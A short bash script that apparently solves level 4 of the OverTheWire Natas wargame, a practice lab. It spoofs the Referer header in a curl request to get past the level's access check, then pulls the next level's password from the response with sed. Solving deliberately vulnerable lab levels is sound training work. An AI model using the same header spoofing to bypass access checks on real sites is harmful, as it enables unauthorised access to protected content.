#!/bin/bash

curl --user $(./natas3.sh) -H"Referer:http://natas5.natas.labs.overthewire.org/" http://natas4.natas.labs.overthewire.org 2>/dev/null | sed -n "s/^.*\(natas[0-9]\+\)\ is\ \(\w\+\).*$/\1:\2/p"
